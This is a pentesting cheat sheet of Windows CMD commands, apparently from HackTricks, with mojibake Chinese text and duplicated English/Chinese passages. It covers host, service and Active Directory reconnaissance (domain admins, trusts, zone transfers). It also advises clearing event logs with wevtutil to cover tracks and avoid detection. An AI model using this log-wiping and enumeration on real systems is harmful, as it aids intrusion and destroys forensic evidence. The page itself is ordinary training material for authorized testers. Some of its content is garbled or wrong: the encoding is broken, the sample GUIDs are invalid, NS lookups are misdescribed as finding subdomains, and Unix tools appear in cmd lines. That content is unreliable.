# Pentestersçš„åŸºæœ¬Win CMD

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç³»ç»Ÿä¿¡æ¯

### ç‰ˆæœ¬å’Œè¡¥ä¸ä¿¡æ¯
```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```
### ç¯å¢ƒ

---

### Basic CMD for Pentesters

### æ¸—é€æµ‹è¯•äººå‘˜çš„åŸºæœ¬CMDå‘½ä»¤

---

#### CMD Basics

#### CMDåŸºç¡€çŸ¥è¯†

CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It allows users to execute commands and perform various tasks using a text-based interface.

CMDï¼ˆå‘½ä»¤æç¤ºç¬¦ï¼‰æ˜¯Windowsæ“ä½œç³»ç»Ÿçš„å‘½ä»¤è¡Œè§£é‡Šå™¨ã€‚å®ƒå…è®¸ç”¨æˆ·ä½¿ç”¨åŸºäºæ–‡æœ¬çš„ç•Œé¢æ‰§è¡Œå‘½ä»¤å’Œæ‰§è¡Œå„ç§ä»»åŠ¡ã€‚

Here are some basic CMD commands that can be useful for pentesters:

ä»¥ä¸‹æ˜¯ä¸€äº›å¯¹æ¸—é€æµ‹è¯•äººå‘˜æœ‰ç”¨çš„åŸºæœ¬CMDå‘½ä»¤ï¼š

#### System Information

#### ç³»ç»Ÿä¿¡æ¯

- `systeminfo`: Displays detailed information about the computer's hardware and software configuration.

- `systeminfo`ï¼šæ˜¾ç¤ºè®¡ç®—æœºç¡¬ä»¶å’Œè½¯ä»¶é…ç½®çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### Network Information

#### ç½‘ç»œä¿¡æ¯

- `ipconfig`: Displays the IP configuration for all network interfaces on the computer.

- `ipconfig`ï¼šæ˜¾ç¤ºè®¡ç®—æœºä¸Šæ‰€æœ‰ç½‘ç»œæ¥å£çš„IPé…ç½®ã€‚

- `netstat`: Displays active network connections, listening ports, and related network statistics.

- `netstat`ï¼šæ˜¾ç¤ºæ´»åŠ¨çš„ç½‘ç»œè¿æ¥ã€ç›‘å¬ç«¯å£å’Œç›¸å…³çš„ç½‘ç»œç»Ÿè®¡ä¿¡æ¯ã€‚

#### File and Directory Management

#### æ–‡ä»¶å’Œç›®å½•ç®¡ç†

- `dir`: Lists the files and directories in the current directory.

- `dir`ï¼šåˆ—å‡ºå½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚

- `cd`: Changes the current directory.

- `cd`ï¼šæ›´æ”¹å½“å‰ç›®å½•ã€‚

- `mkdir`: Creates a new directory.

- `mkdir`ï¼šåˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ã€‚

- `del`: Deletes a file.

- `del`ï¼šåˆ é™¤ä¸€ä¸ªæ–‡ä»¶ã€‚

#### Process Management

#### è¿›ç¨‹ç®¡ç†

- `tasklist`: Displays a list of currently running processes.

- `tasklist`ï¼šæ˜¾ç¤ºå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ã€‚

- `taskkill`: Terminates a running process.

- `taskkill`ï¼šç»ˆæ­¢æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚

#### User Management

#### ç”¨æˆ·ç®¡ç†

- `net user`: Displays information about user accounts and allows for user management.

- `net user`ï¼šæ˜¾ç¤ºæœ‰å…³ç”¨æˆ·å¸æˆ·çš„ä¿¡æ¯ï¼Œå¹¶å…è®¸è¿›è¡Œç”¨æˆ·ç®¡ç†ã€‚

#### Registry Management

#### æ³¨å†Œè¡¨ç®¡ç†

- `reg query`: Displays the values and subkeys of a specified registry key.

- `reg query`ï¼šæ˜¾ç¤ºæŒ‡å®šæ³¨å†Œè¡¨é”®çš„å€¼å’Œå­é”®ã€‚

- `reg add`: Adds a new registry entry or modifies an existing one.

- `reg add`ï¼šæ·»åŠ æ–°çš„æ³¨å†Œè¡¨é¡¹æˆ–ä¿®æ”¹ç°æœ‰çš„æ³¨å†Œè¡¨é¡¹ã€‚

#### Service Management

#### æœåŠ¡ç®¡ç†

- `sc query`: Displays the status of services on the computer.

- `sc query`ï¼šæ˜¾ç¤ºè®¡ç®—æœºä¸ŠæœåŠ¡çš„çŠ¶æ€ã€‚

- `sc start`: Starts a service.

- `sc start`ï¼šå¯åŠ¨ä¸€ä¸ªæœåŠ¡ã€‚

- `sc stop`: Stops a running service.

- `sc stop`ï¼šåœæ­¢æ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚

#### Task Scheduler

#### ä»»åŠ¡è®¡åˆ’ç¨‹åº

- `schtasks`: Displays or modifies scheduled tasks on the computer.

- `schtasks`ï¼šæ˜¾ç¤ºæˆ–ä¿®æ”¹è®¡ç®—æœºä¸Šçš„è®¡åˆ’ä»»åŠ¡ã€‚

#### Remote Desktop

#### è¿œç¨‹æ¡Œé¢

- `mstsc`: Opens the Remote Desktop Connection client.

- `mstsc`ï¼šæ‰“å¼€è¿œç¨‹æ¡Œé¢è¿æ¥å®¢æˆ·ç«¯ã€‚

#### Conclusion

#### ç»“è®º

These are just a few basic CMD commands that can be useful for pentesters. CMD provides a wide range of functionalities for managing and interacting with the Windows operating system. Exploring and understanding these commands can greatly enhance a pentester's capabilities.

è¿™äº›åªæ˜¯ä¸€äº›å¯¹æ¸—é€æµ‹è¯•äººå‘˜æœ‰ç”¨çš„åŸºæœ¬CMDå‘½ä»¤ã€‚CMDæä¾›äº†å¹¿æ³›çš„åŠŸèƒ½ï¼Œç”¨äºç®¡ç†å’Œä¸Windowsæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚æ¢ç´¢å’Œç†è§£è¿™äº›å‘½ä»¤å¯ä»¥æå¤§åœ°å¢å¼ºæ¸—é€æµ‹è¯•äººå‘˜çš„èƒ½åŠ›ã€‚
```bash
set #List all environment variables
```
ä¸€äº›éœ€è¦å¼ºè°ƒçš„ç¯å¢ƒå˜é‡ï¼š

* **COMPUTERNAME**: è®¡ç®—æœºåç§°
* **TEMP/TMP:** ä¸´æ—¶æ–‡ä»¶å¤¹
* **USERNAME:** ç”¨æˆ·å
* **HOMEPATH/USERPROFILE:** ä¸»ç›®å½•
* **windir:** C:\Windows
* **OS**: Windows æ“ä½œç³»ç»Ÿ
* **LOGONSERVER**: åŸŸæ§åˆ¶å™¨åç§°
* **USERDNSDOMAIN**: ç”¨äº DNS çš„åŸŸå
* **USERDOMAIN**: åŸŸå
```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```
### æŒ‚è½½çš„ç£ç›˜

When performing a penetration test on a Windows system, it is important to understand the mounted disks. Mounted disks are additional storage devices that have been attached to the system and are accessible to the operating system.

åœ¨å¯¹Windowsç³»ç»Ÿè¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œäº†è§£æŒ‚è½½çš„ç£ç›˜éå¸¸é‡è¦ã€‚æŒ‚è½½çš„ç£ç›˜æ˜¯é™„åŠ åˆ°ç³»ç»Ÿä¸Šå¹¶å¯è¢«æ“ä½œç³»ç»Ÿè®¿é—®çš„é¢å¤–å­˜å‚¨è®¾å¤‡ã€‚

To view the mounted disks on a Windows system, you can use the `mountvol` command. This command displays a list of all the mounted volumes along with their corresponding volume names and paths.

è¦æŸ¥çœ‹Windowsç³»ç»Ÿä¸Šçš„æŒ‚è½½ç£ç›˜ï¼Œå¯ä»¥ä½¿ç”¨`mountvol`å‘½ä»¤ã€‚è¯¥å‘½ä»¤ä¼šæ˜¾ç¤ºæ‰€æœ‰æŒ‚è½½å·çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬ç›¸åº”çš„å·åå’Œè·¯å¾„ã€‚

```plaintext
C:\> mountvol

Possible values for VolumeName along with current mount points are:

    \\?\Volume{d3e5e6f7-8a9b-1c2d-3e4f-5g6h7i8j9k0l}\
        *** NO MOUNT POINTS ***

    \\?\Volume{a1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6}\
        C:\

    \\?\Volume{m3n4o5p6-q7r8-s9t0-u1v2-w3x4y5z6a7b8}\
        D:\
```

The output of the `mountvol` command shows the volume names and their corresponding mount points. In the example above, the `C:` drive is mounted to the volume named `{a1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6}` and the `D:` drive is mounted to the volume named `{m3n4o5p6-q7r8-s9t0-u1v2-w3x4y5z6a7b8}`.

`mountvol`å‘½ä»¤çš„è¾“å‡ºæ˜¾ç¤ºäº†å·ååŠå…¶ç›¸åº”çš„æŒ‚è½½ç‚¹ã€‚åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œ`C:`é©±åŠ¨å™¨æŒ‚è½½åˆ°åä¸º`{a1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6}`çš„å·ä¸Šï¼Œè€Œ`D:`é©±åŠ¨å™¨æŒ‚è½½åˆ°åä¸º`{m3n4o5p6-q7r8-s9t0-u1v2-w3x4y5z6a7b8}`çš„å·ä¸Šã€‚

Understanding the mounted disks can be useful during a penetration test as it allows you to identify additional storage devices that may contain sensitive information or provide potential attack vectors.

äº†è§£æŒ‚è½½çš„ç£ç›˜åœ¨æ¸—é€æµ‹è¯•ä¸­éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥å¸®åŠ©æ‚¨è¯†åˆ«å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯æˆ–æä¾›æ½œåœ¨æ”»å‡»å‘é‡çš„é™„åŠ å­˜å‚¨è®¾å¤‡ã€‚
```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```
### [é˜²å¾¡è€…](authentication-credentials-uac-and-efs.md#defender)

### å›æ”¶ç«™
```bash
dir C:\$Recycle.Bin /s /b
```
### è¿›ç¨‹ã€æœåŠ¡å’Œè½¯ä»¶

#### Processes è¿›ç¨‹

##### List processes åˆ—å‡ºè¿›ç¨‹

To list all running processes, you can use the `tasklist` command:

```plaintext
tasklist
```

è¦åˆ—å‡ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ `tasklist` å‘½ä»¤ï¼š

```plaintext
tasklist
```

##### Kill a process ç»ˆæ­¢è¿›ç¨‹

To terminate a process, you can use the `taskkill` command followed by the process ID (PID) or the process name:

```plaintext
taskkill /PID <PID>
taskkill /IM <process_name>
```

è¦ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ `taskkill` å‘½ä»¤ï¼Œåé¢è·Ÿç€è¿›ç¨‹çš„è¿›ç¨‹ IDï¼ˆPIDï¼‰æˆ–è¿›ç¨‹åï¼š

```plaintext
taskkill /PID <PID>
taskkill /IM <process_name>
```

#### Services æœåŠ¡

##### List services åˆ—å‡ºæœåŠ¡

To list all services, you can use the `sc` command:

```plaintext
sc query
```

è¦åˆ—å‡ºæ‰€æœ‰æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ `sc` å‘½ä»¤ï¼š

```plaintext
sc query
```

##### Start/Stop a service å¯åŠ¨/åœæ­¢æœåŠ¡

To start or stop a service, you can use the `sc` command followed by the service name and the desired action:

```plaintext
sc start <service_name>
sc stop <service_name>
```

è¦å¯åŠ¨æˆ–åœæ­¢ä¸€ä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ `sc` å‘½ä»¤ï¼Œåé¢è·Ÿç€æœåŠ¡åå’Œæ‰€éœ€çš„æ“ä½œï¼š

```plaintext
sc start <service_name>
sc stop <service_name>
```

#### Software è½¯ä»¶

##### List installed software åˆ—å‡ºå·²å®‰è£…çš„è½¯ä»¶

To list all installed software, you can use the `wmic` command:

```plaintext
wmic product get name,version
```

è¦åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„è½¯ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ `wmic` å‘½ä»¤ï¼š

```plaintext
wmic product get name,version
```
```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```
## åŸŸåä¿¡æ¯

### Whois

```plaintext
whois <domain>
```

ä½¿ç”¨`whois`å‘½ä»¤å¯ä»¥è·å–åŸŸåçš„æ³¨å†Œä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨å†Œäººã€æ³¨å†Œå•†ã€æ³¨å†Œæ—¥æœŸç­‰ã€‚

### DNS

```plaintext
nslookup <domain>
```

ä½¿ç”¨`nslookup`å‘½ä»¤å¯ä»¥æŸ¥è¯¢åŸŸåçš„DNSè®°å½•ï¼ŒåŒ…æ‹¬åŸŸåè§£ææœåŠ¡å™¨å’ŒIPåœ°å€ã€‚

### Zone Transfer

```plaintext
nslookup
> server <dns-server>
> ls -d <domain>
```

ä½¿ç”¨`nslookup`å‘½ä»¤è¿›è¡ŒåŒºåŸŸä¼ è¾“ï¼Œå¯ä»¥è·å–åŸŸåçš„å®Œæ•´DNSè®°å½•ã€‚

### MX Records

```plaintext
nslookup -type=mx <domain>
```

ä½¿ç”¨`nslookup`å‘½ä»¤æŸ¥è¯¢åŸŸåçš„MXè®°å½•ï¼Œå¯ä»¥è·å–ä¸è¯¥åŸŸåå…³è”çš„é‚®ä»¶æœåŠ¡å™¨ä¿¡æ¯ã€‚

### SPF Records

```plaintext
nslookup -type=txt <domain>
```

ä½¿ç”¨`nslookup`å‘½ä»¤æŸ¥è¯¢åŸŸåçš„SPFè®°å½•ï¼Œå¯ä»¥è·å–ä¸è¯¥åŸŸåå…³è”çš„ååƒåœ¾é‚®ä»¶ç­–ç•¥ä¿¡æ¯ã€‚

### Subdomains

```plaintext
nslookup -type=ns <domain>
```

ä½¿ç”¨`nslookup`å‘½ä»¤æŸ¥è¯¢åŸŸåçš„å­åŸŸåï¼Œå¯ä»¥è·å–ä¸è¯¥åŸŸåå…³è”çš„å­åŸŸåä¿¡æ¯ã€‚

### Zone Transfer

```plaintext
dig axfr @<dns-server> <domain>
```

ä½¿ç”¨`dig`å‘½ä»¤è¿›è¡ŒåŒºåŸŸä¼ è¾“ï¼Œå¯ä»¥è·å–åŸŸåçš„å®Œæ•´DNSè®°å½•ã€‚

### MX Records

```plaintext
dig mx <domain>
```

ä½¿ç”¨`dig`å‘½ä»¤æŸ¥è¯¢åŸŸåçš„MXè®°å½•ï¼Œå¯ä»¥è·å–ä¸è¯¥åŸŸåå…³è”çš„é‚®ä»¶æœåŠ¡å™¨ä¿¡æ¯ã€‚

### SPF Records

```plaintext
dig txt <domain>
```

ä½¿ç”¨`dig`å‘½ä»¤æŸ¥è¯¢åŸŸåçš„SPFè®°å½•ï¼Œå¯ä»¥è·å–ä¸è¯¥åŸŸåå…³è”çš„ååƒåœ¾é‚®ä»¶ç­–ç•¥ä¿¡æ¯ã€‚

### Subdomains

```plaintext
dig ns <domain>
```

ä½¿ç”¨`dig`å‘½ä»¤æŸ¥è¯¢åŸŸåçš„å­åŸŸåï¼Œå¯ä»¥è·å–ä¸è¯¥åŸŸåå…³è”çš„å­åŸŸåä¿¡æ¯ã€‚
```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #Â Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
### æ—¥å¿—å’Œäº‹ä»¶

Logs and events are crucial sources of information for a pentester. They provide valuable insights into the activities and behaviors of a system or network. By analyzing logs and events, a pentester can identify vulnerabilities, detect suspicious activities, and gain a better understanding of the target environment.

æ—¥å¿—å’Œäº‹ä»¶æ˜¯æ¸—é€æµ‹è¯•äººå‘˜çš„é‡è¦ä¿¡æ¯æ¥æºã€‚å®ƒä»¬æä¾›äº†æœ‰å…³ç³»ç»Ÿæˆ–ç½‘ç»œæ´»åŠ¨å’Œè¡Œä¸ºçš„å®è´µè§è§£ã€‚é€šè¿‡åˆ†ææ—¥å¿—å’Œäº‹ä»¶ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥è¯†åˆ«æ¼æ´ï¼Œæ£€æµ‹å¯ç–‘æ´»åŠ¨ï¼Œå¹¶æ›´å¥½åœ°äº†è§£ç›®æ ‡ç¯å¢ƒã€‚

#### Windows Event Logs

#### Windowsäº‹ä»¶æ—¥å¿—

Windows operating systems generate various event logs that record important system events. These logs can be accessed using the Event Viewer tool or the command-line interface. The following are some commonly used Windows event logs:

Windowsæ“ä½œç³»ç»Ÿä¼šç”Ÿæˆè®°å½•é‡è¦ç³»ç»Ÿäº‹ä»¶çš„å„ç§äº‹ä»¶æ—¥å¿—ã€‚å¯ä»¥ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨å·¥å…·æˆ–å‘½ä»¤è¡Œç•Œé¢è®¿é—®è¿™äº›æ—¥å¿—ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„Windowsäº‹ä»¶æ—¥å¿—ï¼š

- **Application Log**: Records events related to applications and programs.

- **åº”ç”¨ç¨‹åºæ—¥å¿—**ï¼šè®°å½•ä¸åº”ç”¨ç¨‹åºå’Œç¨‹åºç›¸å…³çš„äº‹ä»¶ã€‚

- **Security Log**: Records security-related events such as logon attempts, privilege use, and system access.

- **å®‰å…¨æ—¥å¿—**ï¼šè®°å½•ä¸å®‰å…¨ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ç™»å½•å°è¯•ã€æƒé™ä½¿ç”¨å’Œç³»ç»Ÿè®¿é—®ã€‚

- **System Log**: Records events related to the operating system and system components.

- **ç³»ç»Ÿæ—¥å¿—**ï¼šè®°å½•ä¸æ“ä½œç³»ç»Ÿå’Œç³»ç»Ÿç»„ä»¶ç›¸å…³çš„äº‹ä»¶ã€‚

- **Setup Log**: Records events related to the installation of software and hardware.

- **å®‰è£…æ—¥å¿—**ï¼šè®°å½•ä¸è½¯ä»¶å’Œç¡¬ä»¶å®‰è£…ç›¸å…³çš„äº‹ä»¶ã€‚

- **Forwarded Events**: Records events forwarded from other computers in the network.

- **è½¬å‘çš„äº‹ä»¶**ï¼šè®°å½•ä»ç½‘ç»œä¸­çš„å…¶ä»–è®¡ç®—æœºè½¬å‘çš„äº‹ä»¶ã€‚

#### Event Log Clearing

#### æ¸…é™¤äº‹ä»¶æ—¥å¿—

As a pentester, it is important to clear event logs to cover your tracks and avoid detection. The following command can be used to clear event logs:

ä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæ¸…é™¤äº‹ä»¶æ—¥å¿—ä»¥è¦†ç›–ä½ çš„è¸ªè¿¹å¹¶é¿å…è¢«æ£€æµ‹æ˜¯å¾ˆé‡è¦çš„ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¸…é™¤äº‹ä»¶æ—¥å¿—ï¼š

```plaintext
wevtutil cl <log_name>
```

Replace `<log_name>` with the name of the event log you want to clear, such as "Application", "Security", or "System".

å°†`<log_name>`æ›¿æ¢ä¸ºè¦æ¸…é™¤çš„äº‹ä»¶æ—¥å¿—çš„åç§°ï¼Œä¾‹å¦‚â€œåº”ç”¨ç¨‹åºâ€ã€â€œå®‰å…¨â€æˆ–â€œç³»ç»Ÿâ€ã€‚

#### Event Log Backup

#### äº‹ä»¶æ—¥å¿—å¤‡ä»½

Backing up event logs is essential for preserving evidence and maintaining a record of system activities. The following command can be used to back up event logs:

å¤‡ä»½äº‹ä»¶æ—¥å¿—å¯¹äºä¿ç•™è¯æ®å’Œè®°å½•ç³»ç»Ÿæ´»åŠ¨è‡³å…³é‡è¦ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¤‡ä»½äº‹ä»¶æ—¥å¿—ï¼š

```plaintext
wevtutil epl <log_name> <backup_file.evtx>
```

Replace `<log_name>` with the name of the event log you want to back up, and `<backup_file.evtx>` with the desired backup file name.

å°†`<log_name>`æ›¿æ¢ä¸ºè¦å¤‡ä»½çš„äº‹ä»¶æ—¥å¿—çš„åç§°ï¼Œå°†`<backup_file.evtx>`æ›¿æ¢ä¸ºæ‰€éœ€çš„å¤‡ä»½æ–‡ä»¶åã€‚

#### Event Log Monitoring

#### äº‹ä»¶æ—¥å¿—ç›‘æ§

Monitoring event logs in real-time can help detect and respond to security incidents promptly. The following command can be used to monitor event logs:

å®æ—¶ç›‘æ§äº‹ä»¶æ—¥å¿—å¯ä»¥å¸®åŠ©åŠæ—¶æ£€æµ‹å’Œå“åº”å®‰å…¨äº‹ä»¶ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç›‘æ§äº‹ä»¶æ—¥å¿—ï¼š

```plaintext
wevtutil qe <log_name> /f:text /c:1 /rd:true
```

Replace `<log_name>` with the name of the event log you want to monitor, such as "Application", "Security", or "System".

å°†`<log_name>`æ›¿æ¢ä¸ºè¦ç›‘æ§çš„äº‹ä»¶æ—¥å¿—çš„åç§°ï¼Œä¾‹å¦‚â€œåº”ç”¨ç¨‹åºâ€ã€â€œå®‰å…¨â€æˆ–â€œç³»ç»Ÿâ€ã€‚

#### Windows Event Forwarding

#### Windowsäº‹ä»¶è½¬å‘

Windows Event Forwarding allows you to collect events from multiple computers in a centralized location for analysis. The following steps outline the process of configuring Windows Event Forwarding:

Windowsäº‹ä»¶è½¬å‘å…è®¸ä½ å°†å¤šå°è®¡ç®—æœºçš„äº‹ä»¶æ”¶é›†åˆ°ä¸€ä¸ªé›†ä¸­ä½ç½®è¿›è¡Œåˆ†æã€‚ä»¥ä¸‹æ­¥éª¤æ¦‚è¿°äº†é…ç½®Windowsäº‹ä»¶è½¬å‘çš„è¿‡ç¨‹ï¼š

1. Configure the event source computer to forward events to a collector computer.

2. Configure the collector computer to collect events from the event source computer.

3. Verify that events are being forwarded and collected successfully.

1. é…ç½®äº‹ä»¶æºè®¡ç®—æœºå°†äº‹ä»¶è½¬å‘åˆ°æ”¶é›†å™¨è®¡ç®—æœºã€‚

2. é…ç½®æ”¶é›†å™¨è®¡ç®—æœºä»äº‹ä»¶æºè®¡ç®—æœºæ”¶é›†äº‹ä»¶ã€‚

3. éªŒè¯äº‹ä»¶æ˜¯å¦æˆåŠŸè½¬å‘å’Œæ”¶é›†ã€‚

#### Sysmon

#### Sysmon

Sysmon (System Monitor) is a powerful Windows utility that provides detailed information about system activity. It can be used to monitor and log events related to process creation, network connections, file creation, and more. Sysmon logs can be analyzed to identify malicious activities and indicators of compromise.

Sysmonï¼ˆç³»ç»Ÿç›‘è§†å™¨ï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„Windowså®ç”¨ç¨‹åºï¼Œæä¾›æœ‰å…³ç³»ç»Ÿæ´»åŠ¨çš„è¯¦ç»†ä¿¡æ¯ã€‚å®ƒå¯ä»¥ç”¨äºç›‘è§†å’Œè®°å½•ä¸è¿›ç¨‹åˆ›å»ºã€ç½‘ç»œè¿æ¥ã€æ–‡ä»¶åˆ›å»ºç­‰ç›¸å…³çš„äº‹ä»¶ã€‚å¯ä»¥åˆ†æSysmonæ—¥å¿—ä»¥è¯†åˆ«æ¶æ„æ´»åŠ¨å’Œå¦¥åæŒ‡æ ‡ã€‚

#### Event Log Analysis

#### äº‹ä»¶æ—¥å¿—åˆ†æ

Analyzing event logs is an essential part of the pentesting process. It helps identify security weaknesses, detect suspicious activities, and uncover potential attack vectors. The following are some key areas to focus on when analyzing event logs:

åˆ†æäº‹ä»¶æ—¥å¿—æ˜¯æ¸—é€æµ‹è¯•è¿‡ç¨‹çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚å®ƒæœ‰åŠ©äºè¯†åˆ«å®‰å…¨å¼±ç‚¹ï¼Œæ£€æµ‹å¯ç–‘æ´»åŠ¨ï¼Œå¹¶æ­ç¤ºæ½œåœ¨çš„æ”»å‡»å‘é‡ã€‚åœ¨åˆ†æäº‹ä»¶æ—¥å¿—æ—¶ï¼Œåº”é‡ç‚¹å…³æ³¨ä»¥ä¸‹å‡ ä¸ªå…³é”®é¢†åŸŸï¼š

- Look for failed login attempts and brute-force attacks.

- å¯»æ‰¾ç™»å½•å°è¯•å¤±è´¥å’Œæš´åŠ›ç ´è§£æ”»å‡»ã€‚

- Identify privilege escalation attempts.

- è¯†åˆ«æƒé™æå‡å°è¯•ã€‚

- Monitor for suspicious network connections and traffic.

- ç›‘æ§å¯ç–‘çš„ç½‘ç»œè¿æ¥å’Œæµé‡ã€‚

- Analyze process creation events for signs of malicious activity.

- åˆ†æè¿›ç¨‹åˆ›å»ºäº‹ä»¶ä»¥å¯»æ‰¾æ¶æ„æ´»åŠ¨çš„è¿¹è±¡ã€‚

- Check for unauthorized access attempts and suspicious file modifications.

- æ£€æŸ¥æœªç»æˆæƒçš„è®¿é—®å°è¯•å’Œå¯ç–‘çš„æ–‡ä»¶ä¿®æ”¹ã€‚

By carefully analyzing event logs, a pentester can gain valuable insights into the security posture of a system or network and identify potential vulnerabilities or security breaches.

